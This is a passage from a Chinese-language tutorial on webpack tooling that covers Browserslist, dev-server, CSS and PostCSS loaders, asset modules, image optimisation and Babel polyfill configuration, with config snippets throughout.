Powershell 还是 Git，你都可以正常设置 Nodejs 环境变量了。注意，cross-env NODE_ENV=production \u0026amp;\u0026amp; npm run clean \u0026amp;\u0026amp; webpack 此类的设置不能使环境变量生效。原因是 \u0026amp;\u0026amp; 符号把命令语句分离成了多个，每一个命令执行的环境都是隔离的，而 cross-env 无法作用于其他环境的命令。\nBrowserlist 在不同的前端工具之间共用目标浏览器和 node 版本的配置文件。它主要被以下工具使用(许多的 webpack 插件会依赖它)：\n1 2 3 4 5 6 Autoprefixer Babel post-preset-env eslint-plugin-compat stylelint-unsupported-browser-features postcss-normalize Browserlist 可以编写的字段：\ndefaults : Browserslist 的默认浏览器 (\u0026gt; 0.5%,last 2 versions, Firefox ESR, not dead)。 5%:通过全球使用情况统计信息选择的浏览器版本。 \u0026gt;=，\u0026lt;和\u0026lt;=工作过 5% in Us:使用美国使用情况统计信息。它接受两个字母的国家/地区代码。 \u0026gt;5%in alt-As:使用亚洲地区使用情况统计信息，有关所有区域代码的列表，请参见 aniuse-lite/data/reqions \u0026gt;5%in my stats:使用自定义用法数据 \u0026gt;5% in browserslist-config-mycompany stats :使用 来自的自定义使用情况数据 browserslist-onfig-mycompany/browserslist-stats,json. cover 99.5%:提供覆盖率的最受欢迎的浏览器 cover 99.5%in us:与上述相同，但国家/地区代码由两个字母组成 cover 99.5%in my stats:使用自定义用法数据 dead:24 个月内没有官方支持或更新的浏览器，现在是 E 10 Mob 11 BlackBerry 10Blackery7，Samsung 4 和 OperaMobile 12.1. last 2versions:每个浏览器的最后 2 个版本。 last 2 Chrome versions:最近 2 个版本的 Chrome 浏览器 last2 major versions 或 last 2 ios major versions:最近 2 个主要版本的所有次要/补丁版本 not ie\u0026lt;= 8:排除先前查询选择的浏览器。 browserslist config:在 Browserslist 配置中定义的浏览器。在差异服务中很有用，可用于修改用户的配置。 可以编写类似于这样的配置:\n\u0026gt; 1% last 2 versions not dead\n之后这些工具会根据配置来获取相关的浏览器信息，以方便决定是否需要进行兼容性的支持:\n条件查询使用的是 caniuse-lite 的工具，这个工具的数据来自于 caniuse 的网站上; 直接使用 browserslist 命令行工具查询根据条件匹配到的浏览器：\n1 npx browserslist \u0026#34;\u0026gt;1%, last 2 version, not dead\u0026#34; Browserlist 可以编写的位置：\n在 package.json 中的配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 { \u0026#34;browserslist\u0026#34;: [ \u0026#34;last 1 version\u0026#34;, \u0026#34;\u0026gt; 1%\u0026#34;, \u0026#34;maintained node versions\u0026#34;, \u0026#34;not dead\u0026#34; ] } 或者 \u0026#34;browserslist\u0026#34;: { \u0026#34;production\u0026#34;: [ \u0026#34;\u0026gt; 1%\u0026#34;, \u0026#34;ie 10\u0026#34; ], \u0026#34;development\u0026#34;: [ \u0026#34;last 1 chrome version\u0026#34;, \u0026#34;last 1 firefox version\u0026#34; ] } 单独的一个配置文件.browserslistrc 文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 注释是这样写的，以#号开头 \u0026gt; 1% #代表全球超过1%使用的浏览器 last 1 version #最后的一个版本 maintained node versions #所有还被 node 基金会维护的 node 版本 not dead 或者 [production staging] \u0026gt; 1% last 2 version not dead [development] last 1 chrome version last 1 firefox version 不配置默认为：**\u0026gt; 0.5%, last 2 versions, Firefox ESR, not dead** webpack-dev-server 类别 配置名称 描述 output path 指定打包生成的输出到硬盘上的目录 output publicPath 表示的是打包生成的 index.html 文件里面引用资源的前缀，同时动态引入的其他脚本也是基于这个路径去请求的 devServer static 用于配置提供额外静态文件内容的目录 内部依赖的是 express 框架。onBeforeSetupMiddleware 在 webpack-dev-server 静态资源中间件处理之前，可以用于拦截部分请求返回特定内容，或者实现简单的数据 mock。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 module.exports = { devServer: { static: path.resolve(__dirname, \u0026#34;public\u0026#34;), port: 8080, open: true, compress: true, // 启动gzip压缩 hot: true, // 启动模块热更新 watchFiles: [\u0026#34;path\u0026#34;], // 不写就监控所有文件 historyApiFallback: true, // 参数用于设置是否启用 HTML5 历史记录 API，用于处理单页应用的路由问题。默认情况下，当使用浏览器的前进/后退按钮时，devServer 会尝试根据 URL 路径查找对应的静态资源，如果找不到就返回 404。如果启用了 historyApiFallback，则会将这些请求重定向到 index.html，然后交给前端路由来处理 proxy: { \u0026#34;/api\u0026#34;: \u0026#34;http://localhost:3000\u0026#34;, \u0026#34;/api2\u0026#34;: { target: \u0026#34;http://localhost:3001\u0026#34;, pathRewrite: { \u0026#34;^/api2\u0026#34;: \u0026#34;\u0026#34; }, }, }, // webpack-dev-server 内部就是一个express服务器，devServer就是express执行返回值 onBeforeSetupMiddleware(devServer) { // express() // 简单模拟一个后端接口 devServer.app.get(\u0026#34;/api/users\u0026#34;, (req, res) =\u0026gt; { res.json([{ id: 1 }, { id: 2 }]); }); }, }, }; 使用 webpack-dev-server 时，内部会使用 webpack 的配置文件模拟打包，并将打包后生成文件的文件根目录和 static 字段指定的文件夹合并后，作为 web 服务器的根目录（/），当访问该地址时，默认访问的就是根目录下的 index.html 文件。而 devServer 配置项指定的目录中的文件也会直接放在本地服务器的根目录下。\n1 2 3 4 5 6 7 8 9 10 11 webpackRequire.p = \u0026#34;http://www.baidu.com\u0026#34;; // 这个就是output中publicPath配置项设置的值 webpackRequire.f.j = (chunkId, promises) =\u0026gt; { var promise = new Promise( (resolve, reject) =\u0026gt; (installedChunkData = installedChunks[chunkId] = [resolve, reject]) ); promises.push((installedChunkData[2] = promise)); var url = webpackRequire.p + webpackRequire.u(chunkId); webpackRequire.l(url); }; css-loader 配置 css-loader：处理 CSS 中的 url 与 @import，并将其视为模块引入，此处是通过 postcss 来解析处理。css-loader 的原理就是借助 postcss，用 postcss-value-parser 解析 CSS 为 AST，并将 CSS 中的 url() 与 @import 解析为模块。\n将 CSS 文件中的样式代码转换成 JavaScript 对象，并以 commonjs 写法导出，以便于其他 Loader 或插件进行处理。\nstyle-loader：使用 DOM API 加载 CSS 资源，使得 CSS 需要在 JS 资源加载完后通过执行 js 动态创建 style 标签，容易出现页面抖动，性能低且对于 SSR 不友好。由于性能需要，在线上通常需要单独加载 CSS 资源，这要求打包器能够将 CSS 打包，此时需要借助于 mini-css-extract-plugin(opens in a new tab) 将 CSS 单独抽离出来。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 { test:/\\.css$/, use:[ \u0026#39;style-loader\u0026#39;, { loader:\u0026#39;css-loader\u0026#39;, //会读取源CSS文件，并且自动可以识别里面import语句并把对应CSS内容合并过来 options:{ url: boolean, // 比如背景图中的url能否被识别 import:boolean, // 是否允许css中使用@import css语法 modules:boolean, // 是否开启css模块化 import style from \u0026#39;./index.css\u0026#39; source-map:boolean, importLoaders:boolean | number, esModules:boolean // import style from \u0026#39;./index.css\u0026#39; style.defalut.xxx 默认为true } } ] } importLoaders:boolean | number, // importloaders Allows to enables/disables or setups number of loaders applied before CSS loader for @import at-rules\ncss-loader 在 css 文件中默认支持 ~ 符号表示 node_modules 文件路径，不需要用户去配置。\n@是 webpack 设置的路径别名，在 webpack 配置文件中设置以后，也可以在 css 中使用 Starting with version 4.0.0, absolute paths are parsed based on the server root To import assets from a node modules path (include resolve.modules) and for alias, prefix it with a ~ 1 2 3 4 5 6 7 { resolve:{ alias:{ \u0026#34;@\u0026#39;:path.resolve(\u0026#39;src\u0026#39;) } } } 1 2 3 4 5 6 7 bg{ width:100px; height:100px; background-image: url(images/kf.jpg); background-image: url(@/images/kf.jpg); background-image:; url(~module/images/a.jpg); // 取node_modules/module/images/a.jpg } 不能在 js 文件中不配置就使用“~”，比如不能：import img from \u0026lsquo;~module/images/a.jpg\u0026rsquo;\nnode-sass sass-loader；sass：老版后缀；scss：新版本后缀\nnode-sass 负责将 scss 或者 sass 编译为 css，原始的 sass 包使用 ruby 写的，本地安装的话需要编译，node-sass 是 node 写的，比较好安装执行。\nwebpack-dev-middleware webpack-dev-middleware就是在 Express 中提供 webpack-dev-server 静态服务能力的一个中间件\n1 npm install webpack-dev-middleware --save-dev 1 2 3 4 5 6 7 8 9 const express = require(\u0026#34;express\u0026#34;); const webpack = require(\u0026#34;webpack\u0026#34;); const webpackDevMiddleware = require(\u0026#34;webpack-dev-middleware\u0026#34;); const webpackOptions = require(\u0026#34;./webpack.config\u0026#34;); const app = express(); const compiler = webpack(webpackOptions); app.use(webpackDevMiddleware(compiler, {})); app.listen(3000); webpack-dev-server 的好处是相对简单，直接安装依赖后执行命令即可 而使用webpack-dev-middleware的好处是可以在既有的 Express 代码基础上快速添加 webpack-dev-server 的功能，同时利用 Express 来根据需要添加更多的功能，如 mock 服务、代理 API 请求等 CSS 兼容性 PostCSS 是一个独立的工具，可以脱离 webpack 单独使用（postcss-cli 在命令行单独使用 postcss 时需要安装该插件）。可以通过 JavaScript 来转换 css 样式，css 的转换和适配，自动添加浏览器厂商前缀，css 样式重置，css 单位转换。\nPostCSS 将 CSS 解析成 AST（抽象语法树），然后使用插件对 AST 进行处理，最后将处理后的 AST 转换为 CSS 代码 autoprefixer 是 PostCSS 的一个插件，它可以根据指定的浏览器版本自动添加所需的浏览器前缀。通过使用 autoprefixer，我们可以避免手动添加浏览器前缀的麻烦，同时也可以确保项目在各个浏览器中正确地显示 postcss-preset-env 是 PostCSS 的一个插件集合，它可以使用未来的 CSS 语法，而不需要等待浏览器支持。postcss-preset-env 包含了一些常用的 CSS 预处理器的语法，如 Sass 和 Less，以及一些未来的 CSS 语法，如 CSS Grid、CSS Variables 等 postcss-less 是 PostCSS 的一个插件，它可以让我们使用 Less 预处理器的语法，从而可以更方便地编写 CSS 代码。通过使用 postcss-less，可以在 Webpack 构建项目时自动将 Less 代码转换为标准的 CSS 代码 还需要结合 Browserlist 的版本兼容配置文件来使用。\n1 npm i postcss-loader postcss-preset-env -D postcss-loader可以使用 PostCSS 处理 CSS postcss-preset-env把现代的 CSS 转换成大多数浏览器能理解的插件集合 PostCSS Preset Env 已经包含了autoprefixer和browserlists选项 postcss 配置文件：\npostcss.config.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 let postcssPresetEnv = require(\u0026#39;postcss-preset-env\u0026#39;); module.exports={ plugins:[postcssPresetEnv({ browsers: \u0026#39;last 5 version\u0026#39; })] } module.exports = { plugins:[ // require(\u0026#34;autoperfixer\u0026#34;) or // require(\u0026#34;postcss-preset-env\u0026#34;) or \u0026#34;postcss-preset-env\u0026#34; ] } { test:/\\.css/, use:[ {loader:\u0026#39;style-loader\u0026#39;}, \u0026#39;css-loader\u0026#39;, { loader:\u0026#39;postcss-loader\u0026#39;, options:{ postcssOptions:{ plugins:[ // require(\u0026#34;autoprefixer\u0026#34;),//这个插件可以不再写了，因为postcss-preset-env中内置使用了autoprefixer require(\u0026#34;postcss-preset-env\u0026#34;) //or // require(\u0026#39;pluginName\u0026#39;)(传参) ] } // plugins:[\u0026#34;postcss-preset-env\u0026#34;] 这是另一种写法 } } //postcss-loader内部会调用options配置中指定的postcss插件对样式文件加兼容性前缀 ] } 资源模块 Rule.type asset-modules type 的四种类型：\nasset/resource 生成单独的文件并导出 URL，在默认情况下，使用asset/resource类型的加载器会生成带有[hash][ext][query]后缀的文件名。如果需要自定义文件名，可以通过设置output.assetModuleFilename属性进行控制 asset/source 导出资产的源代码 asset/inline 导出资产的数据 URI asset 会自动选择导出数据 URI 还是生成单独的文件,可以设置文件大小限制来实现 1 2 3 4 5 6 7 8 9 10 11 12 13 output:{ filename:\u0026#39;js/bundle.js\u0026#39;, path:path.resolve(__dirname,\u0026#34;./build\u0026#34;), assetModuleFilename:\u0026#34;img/[name].[hash:6][ext]\u0026#34; //这会是下面图片资源打包后存放了目录,所有通过 assetModule打包的文件都放在设置的值的目录下，当然后面可以针对每个loader进行不同的配置 } { test:/\\.(jpg|png|svg|gif|jpeg)$/, type:\u0026#34;asset/resource\u0026#34; } 资源模块是一种模块类型，它允许使用资源文件（字体，图标等）而无需配置额外 loader\nraw-loader =\u0026gt; asset/source 导出资源的源代码\nfile-loader =\u0026gt; asset/resource 发送一个单独的文件并导出 URL\n1 2 3 4 5 6 7 8 9 10 11 12 output:{ filename:\u0026#39;bundle.js\u0026#39;, path:path.resolve(__dirname,\u0026#34;./build\u0026#34;) } { test:/\\.(jpg|png|svg|gif|jpeg)$/, type:\u0026#34;asset/resource\u0026#34;, generator:{ filename:\u0026#34;img/[name].[hash:6][ext]\u0026#34; //img会是图片资源打包后存放了目录 } } url-loader =\u0026gt; asset/inline 导出一个资源的 base64\n1 2 3 4 5 6 7 8 9 output:{ filename:\u0026#39;bundle.js\u0026#39;, path:path.resolve(__dirname,\u0026#34;./build\u0026#34;) } { test:/\\.(jpg|png|svg|gif|jpeg)$/, type:\u0026#34;asset/inline\u0026#34; // 不要配置文件打包路径，因为没有输出文件，都在js中以base64表示了 } asset 在导出一个 data URI 和发送一个单独的文件之间自动选择。之前通过使用 url-loader，并且配置资源体积限制实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 output:{ filename:\u0026#39;bundle.js\u0026#39;, path:path.resolve(__dirname,\u0026#34;./build\u0026#34;) } { test:/\\.(jpg|png|svg|gif|jpeg)$/, type:\u0026#34;asset\u0026#34;, generator:{ filename:\u0026#34;img/[name].[hash:6][ext]\u0026#34; }, parser:{ dataUrlCondition:{ maxSize: 10 *1024 // 小于该体积（10kb）则打包为base64 } } } 1 2 3 4 5 6 7 { test:/\\.(ttf|eot|woff|woff2)$/, type:\u0026#39;asset/resource\u0026#39;, generator:{ filename:\u0026#34;font/[name].[ext]\u0026#34; } } query 1 assetModuleFilename:\u0026#39;assets/[hash][ext][query]\u0026#39; query 表示查询参数，比如在源码中：\n1 import png from \u0026#34;./assets/images/logo.png?time=2022-8-21\u0026#34;; 那么打包后生成的，在引入这个文件的时候会在 url 地址的 query 中加上上面设置的值。\n项目中使用图片：\ncss 中 background-image\n1 2 3 #box { background-image: url(\u0026#34;../asset/images/xx/xxx.jpg\u0026#34;); } img 标签的 src 属性\n1 2 3 4 5 6 const imgEl = new Image(); imgEl.src = require(\u0026#34;./src/asset/images/xx/xx.jpg\u0026#34;).default; // file-loader 5版本中的特点 import imgSrc from \u0026#34;./src/asset/images/xx/xx.jpg\u0026#34;; const imgEl = new Image(); imgEl.src = imgSrc; 有时经过 webpack 打包后的文件希望保留源文件的名字再外加一些特别的标识符进行表示。这时候可以借助 webpack 中占位符来实现。常用的占位符：\n[ext] 文件扩展名\n[name] 原文件名\n[hash] 本地打包的 hash 值\n[contentHash] 该文件内容对应的 hash 值\n[hash:length] 指定长度的 hash 值\n[path] 文件相对于 webpack 配置文件的路径\n现在无法直接在 webpack5 中使用 file-loader，url-loader 来打包 CSS 文件中的图片了，而需要改动：\n具体参考文章https://blog.csdn.net/w184167377/article/details/118930758\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 { test: /\\.(jpe?g|png|svg|gif)$/, use: [ { loader: \u0026#34;url-loader\u0026#34;, options: { name: \u0026#34;[name]-[hash:6].[ext]\u0026#34;, esModule: false, limit: 100 * 1024 } } ], type: \u0026#34;javascript/auto\u0026#34; } 图片压缩 image-webpack-loader 可以在 Webpack 打包过程中对图片进行优化和压缩，从而减小图片文件的大小，提高页面加载速度和响应速度 这个库直接安装的话，比较难安装成功，因为里面依赖了一些二进制文件需要编译，网络环境不好的话，就难安装上 它的底层依赖于 imagemin 和一系列的图像优化工具，包括 mozjpeg、optipng、pngquant、svgo、gifsicle 和 webp 等，可以自动选择最优的优化工具对图片进行处理 optipng：用于压缩 PNG 图片的配置项 pngquant：同样用于压缩 PNG 图片的配置项，可以设置图片质量和压缩速度 svgo：用于压缩 SVG 图片的配置项，包含多个插件 gifsicle：用于压缩 Gif 图片的配置项 webp：用于将 JPG/PNG 图片压缩并转换为 WebP 图片格式的配置项 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 { test: /\\.(png)$/, type: \u0026#39;asset/resource\u0026#39; }, { test: /\\.(jpg)$/, type: \u0026#34;asset/inline\u0026#34; }, { test: /\\.(bmp)$/, type: \u0026#34;asset\u0026#34;, parser: { dataUrlCondition: { maxSize: 1024 } } }, { test: /\\.svg$/i, type: \u0026#34;asset/source\u0026#34; }, + { + // 匹配文件的正则表达式，这里表示匹配JPG、PNG、GIF和SVG格式的图片文件 + test: /\\.(jpe?g|png|gif|svg)$/i, type:\u0026#39;xxxx\u0026#39; // 也可以在这里设置 + use: [ + { + // 使用image-webpack-loader对图片进行优化和压缩 + loader: \u0026#39;image-webpack-loader\u0026#39;, + options: { + // 是否禁用图片优化和压缩 + disable: process.env.NODE_ENV === \u0026#39;development\u0026#39;, + mozjpeg: { + progressive: true, // 是否开启渐进式JPEG，可以有效提升JPEG图片加载速度 + quality: 65 // 压缩JPEG图片的质量，取值范围为0到100，值越大质量越好但文件越大 + }, + optipng: { + enabled: true // 是否开启PNG图片的优化，可以有效提升PNG图片加载速度 + }, + pngquant: { + // 压缩PNG图片的质量范围，取值范围为0到1，值越大质量越好但文件越大 + // 第一个数字表示压缩质量的下限，第二个数字表示压缩质量的上限 + quality: [0.65, 0.9], + speed: 4 // 压缩PNG图片的速度，取值范围为1到10，值越大速度越快但质量越低 + }, + svgo: { + plugins: [ // 压缩SVG图片的插件列表，这里包含removeViewBox和cleanupIDs两个插件 + { //用于删除SVG图片中的viewBox属性 + //viewBox属性是用来指定SVG视口范围的，它的值是一个矩形框的坐标和宽高 + removeViewBox: false + }, + { //用于删除SVG图片中的无用ID属性 + cleanupIDs: true + } + ] + }, + gifsicle: { + interlaced: true // 是否开启GIF图片的隔行扫描,可以有效提升GIF图片加载速度 + } + } + } + ] + } 图片响应式 响应式图片是指能够根据设备屏幕大小和分辨率等因素动态调整显示大小和清晰度的图片 在不同设备上显示同一张图片时，响应式图片可以自动选择最优的图片版本，从而保证图片显示效果的一致性和优化网站性能 responsive-loader 是一个 webpack 的 loader，用于实现响应式图片的功能。它可以根据设备屏幕大小和像素密度等因素自动调整图片大小和清晰度，从而提高网站的用户体验和性能 sizes：用于指定不同尺寸的图片大小。在这个例子中，我们指定了 4 个不同的图片大小，分别是 300px、600px、1200px 和 2000px。当加载图片时，responsive-loader 会根据设备的屏幕大小和像素密度等因素自动选择最合适的图片大小 adapter：用于指定图片处理库。在这个例子中，我们使用了 sharp 库，它是一个高性能的图片处理库，可以用来自动调整图片大小和清晰度 srcset 和 sizes 是 HTML 中 img 标签的两个属性，用于实现响应式图片的功能，可以根据设备屏幕大小和像素密度等因素自动选择最合适的图片版本和显示大小，从而提高网站的用户体验和性能 srcset 属性用于指定不同尺寸和清晰度的图片版本，它的值是一个以逗号分隔的图片列表，每个图片元素包含了图片 URL 和对应的宽度或像素密度等信息 sizes 属性用于指定图片在不同屏幕尺寸下的显示大小，它的值是一个以逗号分隔的尺寸列表，每个尺寸元素包含了媒体查询和对应的尺寸信息 浏览器加载这个 img 标签时，它会根据设备的屏幕大小和像素密度等因素，选择最合适的图片版本，并根据 sizes 属性指定的尺寸大小进行显示 1 npm i responsive-loader sharp --save 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 + { + test: /\\.(jpe?g|png)$/i, + //oneOf是一个优化选项，用于提高打包的速度 + oneOf:[ + { + //resourceQuery是一个用于匹配请求资源的URL中查询字符中 + resourceQuery:/sizes/, + use:[ + { + loader:\u0026#39;responsive-loader\u0026#39;, + options:{ + // sizes:[300,600,1024], + adapter:require(\u0026#39;responsive-loader/sharp\u0026#39;) + } + } + ] + }, + { + type: \u0026#39;asset/resource\u0026#39;, + } + ] + } 源码中使用：\n1 2 3 4 5 6 import responsiveImg from \u0026#34;./images/bg.png?sizes[]=300,sizes[]=600,sizes[]=1024\u0026#34;; console.log(responsiveImg); let image = new Image(); image.srcset = responsiveImg.srcSet; image.sizes = `(min-width: 1024) 1024px,100vw`; document.body.appendChild(image); 打印的 responsiveImg 变量的值\nJS 兼容性处理 Babel 默认只转换新的 ES 语法，比如箭头函数 让 babel 能转换其他新语法需要借助包或者 babel 插件\nbabel-loader使用 Babel 和 webpack 转译 JavaScript 文件，用来读取加载项目源码中的 js 文件 @babel/coreBabel 编译的核心包,babel-loader 读取的源码传给@babel/core，由@babel/core 将源码转为 AST 语法树，但是它不知道怎么转为代码，它需要将不同的 ast 部分转发给不同插件或者预设取处理 @babel/preset-env 是 Babel 的一个预设，用于自动检测目标环境并根据需要转换 JavaScript 代码 @babel/preset-react React 插件的 Babel 预设 @babel/preset-typescript 是 Babel 的一个规则集，用于将 TypeScript 代码转译为 JavaScript 代码 @babel/plugin-proposal-decorators 把类和对象装饰器编译成 ES5 @babel/plugin-proposal-class-properties 转换静态类属性以及使用属性初始值化语法声明的属性 1 2 npm i babel-loader @babel/core @babel/preset-env @babel/preset-react -D npm i @babel/plugin-proposal-decorators @babel/plugin-proposal-class-properties @babel/plugin-proposal-private-property-in-object @babel/plugin-proposal-private-methods -D 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 module: { rules: [ + { + test: /\\.jsx?$/, + use: { + loader: \u0026#39;babel-loader\u0026#39;, + options: { + presets: [\u0026#34;@babel/preset-env\u0026#34;, \u0026#39;@babel/preset-react\u0026#39;], + plugins: [ + [\u0026#34;@babel/plugin-proposal-decorators\u0026#34;, { legacy: true }], + [\u0026#34;@babel/plugin-proposal-private-property-in-object\u0026#34;, { \u0026#34;loose\u0026#34;: true }], + [\u0026#34;@babel/plugin-proposal-private-methods\u0026#34;, { \u0026#34;loose\u0026#34;: true }], + [\u0026#34;@babel/plugin-proposal-class-properties\u0026#34;, { loose: true }], + ], + }, + }, + }, ] } 装饰器的写法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 function readonly(target,key,descriptor){ descriptor.writable = false } class Person { @readonly PI =3.14 } let person = new Person() person.PI = 3.15 console.log(person) // PI还是3.14 function decode(target,key,descriptor){ } // 写法一： legacy（传奇）:true 表示老的规则,可以这么写 @decode class Person {} // 写法二（新写法）： class @decode Person {} loose：true 表示可以以 obj.xxx 的方式给对象添加属性，为 false 的话表示 babel 最后以 object.defineProperty 的方式给对象添加属性。\nbabel-polyfill Babel 默认只转换新的 Javascript 语法，而不转换新的 API，比如 Iterator, Generator, Set, Maps, Proxy, Reflect,Symbol,Promise 等全局对象 在全局对象上的方法，比如说 ES6 在 Array 对象上新增了Array.find方法，Babel 就不会转码这个方法 如果想让这个方法运行，必须使用 babel-polyfill来转换等 Babel 7.4 之后不再推荐使用@babel/polyfill babel v7 推荐使用@babel/preset-env 代替以往的诸多 polyfill 方案 babel-preset-env babel-polyfill babel-runtime babel-plugin-transform-runtime 1 npm i @babel/polyfill babel-polyfill 它是通过向全局对象和内置对象的prototype上添加方法来实现的。比如运行环境中不支持Array.prototype.find方法，引入polyfill, 我们就可以使用ES6方法来编写了，但是缺点就是会造成全局空间污染 @babel/preset-env为每一个环境的预设 @babel/preset-env默认只支持语法转化，需要开启useBuiltIns配置才能转化 API 和实例方法 useBuiltIns可选值包括：\u0026ldquo;usage\u0026rdquo; | \u0026ldquo;entry\u0026rdquo; | false, 默认为 false，表示不对polyfills 处理，这个配置是引入 polyfills 的关键 useBuiltIns: false 此时不对 polyfill 做操作。如果项目中手动引入了 @babel/polyfill，则无视配置的浏览器兼容，全量引入所有的 polyfill，无视需要兼容的浏览器条件，打包体积大 useBuiltIns: false src/index.js\n1 2 3 4 import \u0026#34;@babel/polyfill\u0026#34;; let sum = (a, b) =\u0026gt; a + b; let promise = Promise.resolve(); console.log([1, 2, 3].find((item) =\u0026gt; item === 2)); webpack.config.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 const path = require(\u0026#39;path\u0026#39;); module.exports = { mode: \u0026#39;development\u0026#39;, devtool: false, entry: \u0026#39;./src/index.js\u0026#39;, output: { path: path.resolve(__dirname, \u0026#39;dist\u0026#39;), filename: \u0026#39;main.js\u0026#39; }, module: { rules: [ { test: /\\.js?$/, exclude: /node_modules/, use: { loader: \u0026#39;babel-loader\u0026#39;, options: { sourceType: \u0026#34;unambiguous\u0026#34;, + presets: [[\u0026#34;@babel/preset-env\u0026#34;, { useBuiltIns: false }]] } } } ] }, plugins: [] }; useBuiltIns: \u0026ldquo;entry\u0026rdquo; 在项目入口引入一次（多次引入会报错）\n\u0026ldquo;useBuiltIns\u0026rdquo;: \u0026ldquo;entry\u0026rdquo; 根据配置的浏览器兼容，引入浏览器不兼容的 polyfill。需要在入口文件手动添加 import '@babel/polyfill'，会自动根据 browserslist 替换成浏览器不兼容的所有 polyfill，不管自己编写的源代码中是否需要兼容哪些 API，都根据条件统一打包到源码中\n这里需要指定 core-js 的版本,corejs默认是 2\n如果配置 corejs: 3, 则import '@babel/polyfill' 需要改成 import 'core-js/stable';import 'regenerator-runtime/runtime';\n1 npm install --save core-js@2 npm install --save core-js@3 core-js@2\n1 2 3 4 import \u0026#34;@babel/polyfill\u0026#34;; let sum = (a, b) =\u0026gt; a + b; let promise = Promise.resolve(); console.log([1, 2, 3].find((item) =\u0026gt; item === 2)); core-js@3\n1 2 3 4 5 import \u0026#34;core-js/stable\u0026#34;; import \u0026#34;regenerator-runtime/runtime\u0026#34;; let sum = (a, b) =\u0026gt; a + b; let promise = Promise.resolve(); console.log([1, 2, 3].find((item) =\u0026gt; item === 2)); webpack.config.js 1 2 3 4 5 6 { test: /\\.js?$/, exclude: /node_modules/, use: { loader: \u0026#39;babel-loader\u0026#39;, options: { presets: [[\u0026quot;@babel/preset-env\u0026quot;, { useBuiltIns: 'entry', corejs: { version: 3 } }]] } } }\n**\u0026ldquo;useBuiltIns\u0026rdquo;: \u0026ldquo;usage\u0026rdquo; ** \u0026ldquo;useBuiltIns\u0026rdquo;: \u0026ldquo;usage\u0026rdquo; usage 会根据配置的浏览器兼容，以及你代码中用到的 API 来进行 polyfill，实现了按需添加 当设置为 usage 时，polyfill 会自动按需添加，不再需要手工引入@babel/polyfill babel-runtime 为了解决 babel-folyfill 全局空间污染的问题，提供了单独的包babel-runtime用以提供编译模块的工具函数 简单说 babel-runtime 更像是一种按需加载的实现，比如你哪里需要使用 Promise，只要在这个文件头部import Promise from 'babel-runtime/core-js/promise'就行了 1 npm i babel-runtime --save-dev src/index.js\n1 2 import Promise from \u0026#34;babel-runtime/core-js/promise\u0026#34;; const p = new Promise(() =\u0026gt; {}); babel-plugin-transform-runtime @babel/plugin-transform-runtime 插件是为了解决 多个文件重复引用 相同 helpers(帮助函数)=\u0026gt;提取运行时 新 API 方法全局污染 -\u0026gt; 局部引入 启用插件babel-plugin-transform-runtime后，Babel 就会使用babel-runtime下的工具函数 babel-plugin-transform-runtime插件能够将这些工具函数的代码转换成require语句，指向为对babel-runtime的引用 babel-plugin-transform-runtime 就是可以在我们使用新 API 时自动 importbabel-runtime 里面的 polyfill 当使用 async/await 时，自动引入 babel-runtime/regenerator 当使用 ES6 的静态事件或内置对象时，自动引入 babel-runtime/core-js 移除内联babel helpers并替换使用babel-runtime/helpers 来替换 1 npm i @babel/plugin-transform-runtime @babel/runtime-corejs3 --save-dev webpack.config.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 { test: /\\.js?$/, exclude: /node_modules/, use: { loader: \u0026#39;babel-loader\u0026#39;, options: { sourceType: \u0026#34;unambiguous\u0026#34;, presets: [[\u0026#34;@babel/preset-env\u0026#34;, { useBuiltIns: \u0026#39;usage\u0026#39;, corejs: { version: 3 } }]], plugins: [ [ \u0026#34;@babel/plugin-transform-runtime\u0026#34;, { corejs: 3, helpers: true, regenerator: true } ], ] } } } 当我们使用 ES6 的静态事件或内置对象时自动引入 babel-runtime/core-js\n1 2 3 //var _Promise = __webpack_require__(\u0026#34;./node_modules/@babel/runtime-corejs3/core-js-stable/promise.js\u0026#34;); const p = new Promise(() =\u0026gt; {}); console.log(p); helpers: true 移除内联 babel helpers 并替换使用babel-runtime/helpers 来替换 避免内联的 helper 代码在多个文件重复出现 1 2 3 class A {} class B extends A {} console.log(new B()); regenerator: true 是否开启generator函数转换成使用regenerator runtime来避免污染全局域 1 2 3 4 //var _regeneratorRuntime = __webpack_require__(/*! @babel/runtime-corejs3/regenerator */ \u0026#34;./node_modules/@babel/runtime-corejs3/regenerator/index.js\u0026#34;); function* gen() {} console.log(gen()); 最佳实践 @babel/preset-env 和 plugin-transform-runtime 二者都可以设置使用 corejs 来处理 polyfill 项目开发 useBuiltIns 使用 usage\nplugin-transform-runtime 只使用其移除内联复用的辅助函数的特性，减小打包体积\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 { \u0026#34;presets\u0026#34;: [ [ \u0026#34;@babel/preset-env\u0026#34;, { \u0026#34;useBuiltIns\u0026#34;: \u0026#34;usage\u0026#34;, \u0026#34;corejs\u0026#34;: 3 } ] ], \u0026#34;plugins\u0026#34;: [ [ \u0026#34;@babel/plugin-transform-runtime\u0026#34;, { \u0026#34;corejs\u0026#34;: false, \u0026#34;helpers\u0026#34;: true, \u0026#34;regenerator\u0026#34;: true } ] ] } 类库开发 类库开发尽量不使用污染全局环境的polyfill，因此@babel/preset-env只发挥语法转换的功能 polyfill 由@babel/plugin-transform-runtime来处理，推荐使用 core-js@3 1 2 3 4 5 6 7 8 9 10 11 12 13 { 